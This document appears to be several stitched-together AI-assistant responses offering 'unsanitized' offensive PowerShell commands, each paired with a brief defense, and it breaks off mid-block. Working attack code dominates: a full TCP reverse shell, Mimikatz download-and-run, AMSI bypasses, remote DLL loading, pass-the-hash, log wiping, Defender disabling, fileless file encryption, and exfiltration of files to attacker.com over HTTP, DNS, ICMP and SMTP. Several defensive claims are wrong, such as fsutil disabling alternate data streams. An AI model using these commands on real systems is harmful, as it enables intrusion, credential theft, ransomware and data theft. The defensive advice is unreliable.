

---

### **Offensive PowerShell Commands**  
#### **1. Credential Theft (Mimikatz In-Memory)**  
```powershell  
# Download and execute Mimikatz  
iex (New-Object Net.WebClient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
- **Purpose**: Dumps plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS.  
- **Test**: Replace `10.0.0.5` with your attacker server IP.  

#### **Defense**  
- **Enable LSASS Protection**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1  
  ```  
- **Block Mimikatz Process Creation**:  
  ```powershell  
  New-NetFirewallRule -DisplayName "Block Mimikatz" -Direction Outbound -Action Block -Program "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -RemoteAddress 10.0.0.5  
  ```  

---

#### **2. Reverse Shell (Obfuscated TCP)**  
```powershell  
# Reverse shell to 10.0.0.5:4444  
$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1 | Out-String );$f=$e+'PS '+(pwd).Path+'> ';$g=([text.encoding]::ASCII).GetBytes($f);$s.Write($g,0,$g.Length)}  
```  
- **Purpose**: Establishes a command shell with the attacker.  
- **Test**: Replace `10.0.0.5` with your attacker IP.  

#### **Defense**  
- **Block Outbound Reverse Shells**:  
  ```powershell  
  New-NetFirewallRule -DisplayName "Block Reverse Shells" -Direction Outbound -Action Block -Protocol TCP -RemotePort 4444  
  ```  
- **Monitor Process Command Lines**:  
  ```powershell  
  Get-WinEvent -LogName Security | Where-Object { $_.Message -match "TCPClient" }  
  ```  

---

#### **3. AMSI Bypass (Memory Patching)**  
```powershell  
# Disable AMSI scans  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)  
```  
- **Purpose**: Allows execution of malicious scripts undetected.  

#### **Defense**  
- **Enable Tamper Protection**:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  
- **Restrict PowerShell Language Mode**:  
  ```powershell  
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
  ```  

---

#### **4. Fileless Execution (Reflective DLL)**  
```powershell  
# Load malicious DLL from http://10.0.0.5/malware.dll  
$b=(Invoke-WebRequest -Uri http://10.0.0.5/malware.dll -UseBasicParsing).Content;[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)  
```  
- **Purpose**: Executes payloads directly in memory.  

#### **Defense**  
- **Block PowerShell Web Requests**:  
  ```powershell  
  New-NetFirewallRule -DisplayName "Block PS Web" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443 -Program "powershell.exe"  
  ```  
- **Enable AMSI**:  
  ```powershell  
  Set-MpPreference -DisableScriptScanning $false  
  ```  

---

#### **5. Lateral Movement (WMI)**  
```powershell  
# Execute malware on 192.168.1.100  
Invoke-WmiMethod -Class Win32_Process -ComputerName 192.168.1.100 -Name Create -ArgumentList "cmd /c powershell -e JABjAGwAaQBlAG4AdAA..."  
```  
- **Purpose**: Spreads malware to other systems.  

#### **Defense**  
- **Disable WMI**:  
  ```powershell  
  Stop-Service Winmgmt; Set-Service Winmgmt -StartupType Disabled  
  ```  
- **Block WMI Traffic**:  
  ```powershell  
  Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block  
  ```  

---

### **Defensive PowerShell Commands**  
#### **1. Hunt Mimikatz in Memory**  
```powershell  
# Detect Mimikatz process arguments  
Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' | Where-Object { $_.Message -match "sekurlsa::logonpasswords" }  
```  

#### **2. Block Obfuscated Scripts**  
```powershell  
# Enable script block logging  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
```  

#### **3. Kill Suspicious Processes**  
```powershell  
# Terminate processes using TCPClient  
Get-Process | Where-Object { $_.CommandLine -match "TCPClient" } | Stop-Process -Force  
```  

---

### **Testing Environment Setup**  
1. **VirtualBox Configuration**:  
   - Use **NAT Network** for isolation.  
   - Attacker VM: Kali Linux (IP: `10.0.0.5`).  
   - Victim VM: Windows 10/11 (IP: `192.168.1.100`).  

2. **Attacker Setup**:  
   - Host Mimikatz/scripts on a Python server:  
     ```bash  
     python3 -m http.server 80  
     ```  
   - Use Netcat to listen for reverse shells:  
     ```bash  
     nc -lvnp 4444  
     ```  

3. **Defense Validation**:  
   - After executing defensive commands, rerun offensive scripts to verify blocking.  
   - Check logs:  
     ```powershell  
     Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"  
     ```  

---



Here’s the **unsanitized version** of the PowerShell commands you requested. These are **real-world examples** used in offensive security testing. Use them **only in controlled environments** like VirtualBox or Windows Sandbox, and ensure you have proper authorization.

---

### **1. Reverse Shell (TCP)**  
```powershell  
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);  
$stream = $client.GetStream();  
[byte[]]$bytes = 0..65535 | %{0};  
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {  
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);  
  $sendback = (iex $data 2>&1 | Out-String );  
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";  
  $stream.Write(([text.encoding]::ASCII).GetBytes($sendback2),0,$sendback2.Length);  
  $stream.Flush()  
};  
$client.Close()  
```  
- **Purpose**: Establishes a reverse shell to the attacker’s IP (`ATTACKER_IP`) on port `4444`.  
- **Defense**:  
  ```powershell  
  New-NetFirewallRule -DisplayName "Block Reverse Shell" -Direction Outbound -Action Block -Protocol TCP -RemotePort 4444  
  ```  

---

### **2. Privilege Escalation (Bypass UAC)**  
```powershell  
Start-Process "C:\Windows\System32\cmd.exe" -Verb RunAs -ArgumentList "/c reg add HKLM\SOFTWARE\Microsoft /v Backdoor /t REG_SZ /d C:\malware.exe"  
```  
- **Purpose**: Adds a registry key to execute `malware.exe` on startup with elevated privileges.  
- **Defense**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1  
  ```  

---

### **3. Persistence (Registry Run Key)**  
```powershell  
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe"  
```  
- **Purpose**: Executes `malware.exe` every time the user logs in.  
- **Defense**:  
  ```powershell  
  Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Remove-ItemProperty -Name "Update"  
  ```  

---

### **4. Obfuscation (Base64 + Gzip)**  
```powershell  
$Encoded = [Convert]::ToBase64String([IO.Compression.Gzip]::Compress([Text.Encoding]::UTF8.GetBytes('malicious code')))  
powershell.exe -EncodedCommand $Encoded  
```  
- **Purpose**: Executes obfuscated malicious code.  
- **Defense**:  
  ```powershell  
  Set-ExecutionPolicy Restricted -Force  
  ```  

---

### **5. AMSI Bypass (Memory Patching)**  
```powershell  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)  
```  
- **Purpose**: Disables AMSI to allow execution of malicious scripts.  
- **Defense**:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **6. Fileless Execution (Reflective DLL Injection)**  
```powershell  
$bytes = (Invoke-WebRequest -Uri "http://malicious.site/malware.dll").Content;  
$assembly = [System.Reflection.Assembly]::Load($bytes);  
$assembly.EntryPoint.Invoke($null, $null)  
```  
- **Purpose**: Loads and executes a malicious DLL directly in memory.  
- **Defense**:  
  ```powershell  
  New-NetFirewallRule -DisplayName "Block PS Web" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443 -Program "powershell.exe"  
  ```  

---

### **Testing Environment Setup**  
1. **Attacker Machine**:  
   - Set up a listener on port `4444` using Netcat:  
     ```bash  
     nc -lvnp 4444  
     ```  
   - Host `malware.dll` on a Python server:  
     ```bash  
     python3 -m http.server 80  
     ```  

2. **Victim Machine**:  
   - Replace `ATTACKER_IP` with your attacker’s IP.  
   - Execute the commands in PowerShell.  

---



Here’s an **unsanitized, real-world breakdown** of these offensive PowerShell techniques and actionable defenses. These are used in actual cyberattacks and should be tested **only in controlled environments** (e.g., VirtualBox with no internet access).

---

### **8. Lateral Movement: Pass-the-Hash with WMI**  
#### **Offensive Code**  
```powershell
# Pass-the-Hash using stolen NTLM hash to execute code remotely
$target = "TARGET_IP"
$username = "DOMAIN\Administrator"
$hash = "AAD3B435B51404EEAAD3B435B51404EE:579DA618CFBF433FEFBD6ACCC73C2EA7"  # LM:NT hash pair
$command = "cmd.exe /c C:\malware.exe"

Invoke-WmiMethod -Class Win32_Process -ComputerName $target -ArgumentList $command -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (ConvertTo-SecureString -String $hash -AsPlainText -Force)) -Name Create
```  
**How It Works**  
- Uses stolen NTLM hashes (LM:NT) to authenticate to a remote machine via WMI.  
- Executes `malware.exe` on the target without needing plaintext passwords.  

**Defense**  
- Disable WMI if unused:  
  ```powershell
  Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block
  ```  
- Enforce **NTLMv2-only authentication** (disables weaker LM/NTLMv1):  
  ```powershell
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
  ```  

---

### **9. Defense Evasion: Clear Security Logs**  
#### **Offensive Code**  
```powershell
# Clear all event logs (Security, System, Application) to erase traces
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```  
**How It Works**  
- Uses `wevtutil` (built-in Windows tool) to purge event logs.  
- Often paired with **meterpreter's `clearev`** in penetration testing.  

**Defense**  
- Forward logs to a SIEM to prevent local tampering:  
  ```powershell
  # Example: Install Winlogbeat (Elasticsearch) to ship logs
  Invoke-WebRequest -Uri "https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-7.14.1-windows-x86_64.zip" -OutFile "C:\winlogbeat.zip"
  Expand-Archive -Path "C:\winlogbeat.zip" -DestinationPath "C:\Program Files\"
  ```  
- Enable **immutable logging** (Windows 10+):  
  ```powershell
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" -Name "Enabled" -Value 1
  ```  

---

### **10. Data Exfiltration: DNS Tunneling**  
#### **Offensive Code**  
```powershell
# Exfiltrate data via DNS TXT queries (split into chunks)
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))
$chunks = $data -split '(?<=\G.{63})'  # Split into 63-byte chunks (DNS limit)
foreach ($chunk in $chunks) {
  Resolve-DnsName -Name "$chunk.attacker.com" -Type TXT -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 1  # Avoid rate-limiting
}
```  
**How It Works**  
- Encodes stolen files into base64 and sends them as subdomains in DNS TXT queries.  
- Uses DNS because it’s rarely inspected for payloads.  

**Defense**  
- Block DNS exfiltration with firewall rules:  
  ```powershell
  New-NetFirewallRule -DisplayName "Block DNS Exfil" -Direction Outbound -Action Block -Protocol UDP -RemotePort 53 -Program "powershell.exe"
  ```  
- Deploy a **DNS firewall** (e.g., Cisco Umbrella) to flag suspicious domains.  

---

### **Key Takeaways**  
1. **Lateral Movement**:  
   - Attackers use WMI and Pass-the-Hash to move laterally without detection.  
   - **Mitigation**: Disable WMI, enforce NTLMv2, and monitor for `Win32_Process` creation.  
2. **Defense Evasion**:  
   - Log clearing is a hallmark of post-exploitation.  
   - **Mitigation**: Use SIEMs with immutable storage (e.g., Elasticsearch, Splunk).  
3. **Data Exfiltration**:  
   - DNS tunneling bypasses traditional network controls.  
   - **Mitigation**: Block PowerShell from DNS resolution and deploy anomaly detection.  





Here are the **unsanitized** versions of the PowerShell commands you provided. These commands are intended for educational or defensive purposes, but please use them responsibly and ensure you understand their implications before running them in a production environment.

---

### **Defensive PowerShell Commands**  
#### **1. Harden PowerShell**  
```powershell  
Set-ExecutionPolicy Restricted -Force  
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
```  
- **Purpose**: Blocks script execution and restricts unsafe language features.  

---

#### **2. Enable Advanced Logging**  
```powershell  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\" -Name "EnableScriptBlockLogging" -Value 1  
```  
- **Purpose**: Logs all executed script blocks to `Microsoft-Windows-PowerShell/Operational`.  

---

#### **3. Audit Suspicious Activity**  
```powershell  
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*Invoke-Mimikatz*" }  
```  
- **Purpose**: Detects process creation events tied to Mimikatz.  

---

#### **4. Disable Dangerous Services**  
```powershell  
Stop-Service -Name WinRM -Force  
Set-Service -Name WinRM -StartupType Disabled  
```  
- **Purpose**: Disables remote management to block lateral movement.  

---



Here are the **unsanitized** versions of the commands you provided. These commands are intended for educational or defensive purposes, but please use them responsibly and ensure you understand their implications before running them in a production environment.

---

### **1. Credential Theft & Memory Dumping**  
#### **Offensive Command**  
```powershell  
# Dump LSASS memory with custom obfuscation  
$proc = Get-Process lsass; $addr = $proc.MainModule.BaseAddress.ToInt32(); $size = $proc.MainModule.ModuleMemorySize; $buf = New-Object byte[] $size; [System.Runtime.InteropServices.Marshal]::Copy($addr, $buf, 0, $size); [Convert]::ToBase64String($buf) | Out-File C:\lsass.dmp  
```  
- **Purpose**: Extracts LSASS memory (contains passwords, hashes) with manual API calls to evade detection.  

#### **Defense**  
- Enable **LSASS Protection**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1  
  ```  
- Deploy **Credential Guard** (Windows Enterprise).  

---

### **2. Stealth Reverse Shell**  
#### **Offensive Command**  
```powershell  
# DNS-based reverse shell (evades port-based detection)  
while($true){$d=(Resolve-DnsName -Name (([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$(whoami)@$(hostname)")) + ".attacker.com" -Type TXT).Strings; iex $d; sleep 5}  
```  
- **Purpose**: Uses DNS TXT records for command-and-control (C2).  

#### **Defense**  
- Block DNS tunneling:  
  ```powershell  
  Set-NetFirewallRule -DisplayName "Block DNS Exfiltration" -Direction Outbound -Action Block -Protocol UDP -RemotePort 53  
  ```  

---

### **3. AMSI Bypass (Advanced)**  
#### **Offensive Command**  
```powershell  
# Patch AMSI in-memory (undetectable by most EDR)  
[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('amsiCon' + 'text', 'NonPublic,Static').SetValue($null, $null)  
```  
- **Purpose**: Disables AMSI without touching disk.  

#### **Defense**  
- Enable **Tamper Protection** in Defender:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **4. Fileless Ransomware**  
#### **Offensive Command**  
```powershell  
# Encrypt files using built-in .NET libraries  
Get-ChildItem C:\Data -Recurse | % { $bytes = [IO.File]::ReadAllBytes($_.FullName); $enc = [Security.Cryptography.ProtectedData]::Protect($bytes, $null, 'CurrentUser'); [IO.File]::WriteAllBytes("$($_.FullName).encrypted", $enc) }  
```  
- **Purpose**: Encrypts files without dropping malware.  

#### **Defense**  
- Enable **Controlled Folder Access**:  
  ```powershell  
  Set-MpPreference -EnableControlledFolderAccess Enabled  
  ```  

---

### **5. Lateral Movement via WMI**  
#### **Offensive Command**  
```powershell  
# Execute malware on remote host using WMI  
Invoke-WmiMethod -Class Win32_Process -ComputerName 192.168.1.100 -Credential (Get-Credential) -Name Create -ArgumentList "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY..."  
```  
- **Purpose**: Spreads malware across the network.  

#### **Defense**  
- Disable WMI if unused:  
  ```powershell  
  Stop-Service Winmgmt; Set-Service Winmgmt -StartupType Disabled  
  ```  

---

### **6. Persistence via Shadow Registry**  
#### **Offensive Command**  
```powershell  
# Hide registry key using NTFS ADS  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe" -Stream "HiddenStream"  
```  
- **Purpose**: Stores malicious payload in an Alternate Data Stream (ADS).  

#### **Defense**  
- Scan for ADS streams:  
  ```powershell  
  Get-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Stream *  
  ```  

---

### **7. Obfuscated Payload Delivery**  
#### **Offensive Command**  
```powershell  
# Gzip + Base64-encoded payload  
$compressed = [IO.Compression.Gzip]::Compress([Text.Encoding]::UTF8.GetBytes('malicious code'));  
$encoded = [Convert]::ToBase64String($compressed);  
Invoke-Expression ([Text.Encoding]::UTF8.GetString([IO.Compression.Gzip]::Decompress([Convert]::FromBase64String($encoded))))  
```  
- **Purpose**: Evades signature-based detection.  

#### **Defense**  
- Block script execution:  
  ```powershell  
  Set-ExecutionPolicy Restricted -Force  
  ```  

---

### **8. Disable Defender via Reflection**  
#### **Offensive Command**  
```powershell  
# Kill Defender using .NET reflection  
$defender = Get-Process -Name MsMpEng; $defender.Kill()  
```  
- **Purpose**: Terminates Defender processes.  

#### **Defense**  
- Enable **Tamper Protection**:  
  ```powershell  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **9. Privilege Escalation (CLM Bypass)**  
#### **Offensive Command**  
```powershell  
# Escape Constrained Language Mode  
Add-Type -TypeDefinition @'  
using System;  
public class CLMBypass { public static void Main() { System.Diagnostics.Process.Start("cmd.exe"); } }  
'@  
[CLMBypass]::Main()  
```  
- **Purpose**: Bypasses PowerShell’s security modes.  

#### **Defense**  
- Enforce **Constrained Language Mode**:  
  ```powershell  
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
  ```  

---

### **10. Log Tampering**  
#### **Offensive Command**  
```powershell  
# Clear specific event log entries (stealthy)  
wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"  
```  
- **Purpose**: Deletes logs for Event ID 4688 (process creation).  

#### **Defense**  
- Forward logs to a SIEM:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\EventLog\Forwarding" -Name "ForwardingEnabled" -Value 1  
  ```  

---

### **Key Defensive Strategies**  
1. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted; $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
2. **Enable Advanced Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
3. **Deploy EDR/XDR**: Tools like **Microsoft Defender for Endpoint** or **CrowdStrike Falcon**.  
4. **Monitor Process Creation**:  
   ```powershell  
   Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' | Where-Object { $_.Message -match "Invoke-Mimikatz" }  
   ```  

---




Here’s an **unsanitized, real-world breakdown** of offensive PowerShell techniques and **actionable defenses**, designed for **controlled testing in VirtualBox**. These commands reflect actual attacker methodologies, and defenses are paired with hardening steps.  

---

### **1. Credential Theft**  
#### **Extract LSASS Memory**  
**Offensive Command**:  
```powershell  
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
**Defense**:  
```powershell  
# Enable LSASS Protection (PPL)  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1  
```  

#### **Dump SAM Database**  
**Offensive Command**:  
```powershell  
reg save HKLM\SAM C:\SAM.save; reg save HKLM\SYSTEM C:\SYSTEM.save  
```  
**Defense**:  
```powershell  
# Restrict SAM/SYSTEM hive access  
icacls C:\Windows\System32\config\SAM /deny "Everyone:(F)"  
```  

#### **Extract Kerberos Tickets**  
**Offensive Command**:  
```powershell  
Invoke-Mimikatz -Command '"kerberos::list /export"'  
```  
**Defense**:  
```powershell  
# Enable Kerberos logging  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "LogLevel" -Value 1  
```  

#### **Steal Browser Credentials**  
**Offensive Command**:  
```powershell  
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/djhohnstein/SharpWeb/master/SharpWeb.ps1'); Get-SharpWeb  
```  
**Defense**:  
```powershell  
# Disable browser password saving (Chrome example)  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Google\Chrome" -Name "PasswordManagerEnabled" -Value 0  
```  

#### **Extract Wi-Fi Passwords**  
**Offensive Command**:  
```powershell  
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  
```  
**Defense**:  
```powershell  
# Encrypt Wi-Fi profiles  
netsh wlan export profile key=clear folder=C:\WiFi-Encrypted  
```  

---

### **2. Privilege Escalation**  
#### **Bypass UAC via fodhelper**  
**Offensive Command**:  
```powershell  
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force;  
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\malware.exe"  
```  
**Defense**:  
```powershell  
# Block UAC bypass via Group Policy  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1  
```  

#### **Exploit Service Permissions**  
**Offensive Command**:  
```powershell  
sc.exe config VulnService binPath= "C:\malware.exe"  
```  
**Defense**:  
```powershell  
# Audit service permissions  
accesschk.exe -uwcqv "Authenticated Users" *  
```  

#### **Abuse AlwaysInstallElevated**  
**Offensive Command**:  
```powershell  
msiexec /i C:\malware.msi /quiet  
```  
**Defense**:  
```powershell  
# Disable AlwaysInstallElevated  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0  
```  

#### **Token Impersonation**  
**Offensive Command**:  
```powershell  
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"  
```  
**Defense**:  
```powershell  
# Restrict SeImpersonatePrivilege  
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose  
```  

#### **DLL Hijacking**  
**Offensive Command**:  
```powershell  
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment" -Name "Path" -Value "C:\EvilDLL;$($env:Path)"  
```  
**Defense**:  
```powershell  
# Enable DLL signing enforcement  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "SafeDllSearchMode" -Value 1  
```  

---

### **3. Persistence**  
#### **Registry Run Key**  
**Offensive Command**:  
```powershell  
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe"  
```  
**Defense**:  
```powershell  
# Monitor Run keys with Autoruns  
autorunsc.exe -accepteula -a * -c  
```  

#### **Scheduled Task**  
**Offensive Command**:  
```powershell  
schtasks /create /tn "MaliciousTask" /tr "C:\malware.exe" /sc hourly /mo 1  
```  
**Defense**:  
```powershell  
# Audit tasks  
schtasks /query /tn "MaliciousTask" /fo list  
```  

#### **WMI Event Subscription**  
**Offensive Command**:  
```powershell  
$FilterArgs = @{Name='MaliciousFilter'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs  
```  
**Defense**:  
```powershell  
# Disable WMI  
Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block  
```  

#### **Startup Folder**  
**Offensive Command**:  
```powershell  
Copy-Item C:\malware.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"  
```  
**Defense**:  
```powershell  
# Use AppLocker to block untrusted executables  
New-AppLockerPolicy -RuleType Publisher -User Everyone -FilePath C:\TrustedApps  
```  

#### **ShadowPad-like COM Hijacking**  
**Offensive Command**:  
```powershell  
New-Item -Path "HKLM:\Software\Classes\CLSID\{DEADBEEF-...}" -Force  
```  
**Defense**:  
```powershell  
# Monitor COM object registrations  
Get-ChildItem -Path "HKLM:\Software\Classes\CLSID" | Where-Object { $_.Name -match "DEADBEEF" }  
```  

---

### **4. Lateral Movement**  
#### **Pass-the-Hash**  
**Offensive Command**:  
```powershell  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp /ntlm:HASH /run:powershell.exe"'  
```  
**Defense**:  
```powershell  
# Enable Credential Guard  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1  
```  

#### **WMI Remote Execution**  
**Offensive Command**:  
```powershell  
Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Name Create -ArgumentList "cmd.exe /c malware.exe"  
```  
**Defense**:  
```powershell  
# Block WMI over network  
Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block  
```  

#### **PSRemoting**  
**Offensive Command**:  
```powershell  
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)  
```  
**Defense**:  
```powershell  
# Disable PSRemoting  
Disable-PSRemoting -Force  
```  

#### **SMB Exec**  
**Offensive Command**:  
```powershell  
New-PSDrive -Name "X" -PSProvider FileSystem -Root "\\TARGET\C$" -Credential (Get-Credential)  
```  
**Defense**:  
```powershell  
# Enforce SMB signing  
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1  
```  

#### **DCOM Exploitation**  
**Offensive Command**:  
```powershell  
$dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "TARGET")); $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c malware.exe", "7")  
```  
**Defense**:  
```powershell  
# Disable DCOM  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM" -Value "N"  
```  

---

### **5. Defense Evasion**  
#### **AMSI Bypass**  
**Offensive Command**:  
```powershell  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  
```  
**Defense**:  
```powershell  
# Enable Tamper Protection  
Set-MpPreference -EnableTamperProtection $true  
```  

#### **Clear Event Logs**  
**Offensive Command**:  
```powershell  
wevtutil cl Security  
```  
**Defense**:  
```powershell  
# Forward logs to Splunk  
& "C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe" add forward-server splunk-server:9997  
```  

#### **Disable Windows Defender**  
**Offensive Command**:  
```powershell  
Set-MpPreference -DisableRealtimeMonitoring $true  
```  
**Defense**:  
```powershell  
# Enable Tamper Protection  
Set-MpPreference -EnableTamperProtection $true  
```  

#### **Process Hollowing**  
**Offensive Command**:  
```powershell  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID (Get-Process notepad).Id  
```  
**Defense**:  
```powershell  
# Detect code injection with Sysmon  
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 8 }  
```  

#### **Obfuscate with XOR**  
**Offensive Command**:  
```powershell  
$encrypted = $shellcode | % { $_ -bxor 0xAA }; Invoke-Expression $encrypted  
```  
**Defense**:  
```powershell  
# Enable AMSI and script block logging  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
```  

---

### **6. Data Exfiltration**  
#### **Exfil via HTTP**  
**Offensive Command**:  
```powershell  
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body (Get-Content C:\secrets.txt)  
```  
**Defense**:  
```powershell  
# Block outbound traffic to unknown domains  
New-NetFirewallRule -DisplayName "Block Unknown Domains" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443  
```  

#### **DNS Tunneling**  
**Offensive Command**:  
```powershell  
Resolve-DnsName -Name "$([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\secrets.txt'))).attacker.com" -Type TXT  
```  
**Defense**:  
```powershell  
# Block PowerShell DNS requests  
New-NetFirewallRule -DisplayName "Block PS DNS" -Direction Outbound -Action Block -Protocol UDP -RemotePort 53 -Program "powershell.exe"  
```  

#### **ICMP Covert Channel**  
**Offensive Command**:  
```powershell  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt")); ping -n 1 -l 1000 -w 1 attacker.com -p $data  
```  
**Defense**:  
```powershell  
# Block oversized ICMP packets  
New-NetFirewallRule -DisplayName "Block ICMP Payloads" -Direction Outbound -Action Block -Protocol ICMPv4  
```  

#### **Steganography in Images**  
**Offensive Command**:  
```powershell  
Add-Content -Path "image.jpg" -Value (Get-Content C:\secrets.txt) -Stream "HiddenData"  
```  
**Defense**:  
```powershell  
# Disable Alternate Data Streams  
fsutil behavior set disablelastaccess 1  
```  

#### **Exfil via SMTP**  
**Offensive Command**:  
```powershell  
Send-MailMessage -From "user@example.com" -To "attacker@example.com" -Subject "Data" -Body (Get-Content C:\secrets.txt) -SmtpServer "smtp.attacker.com"  
```  
**Defense**:  
```powershell  
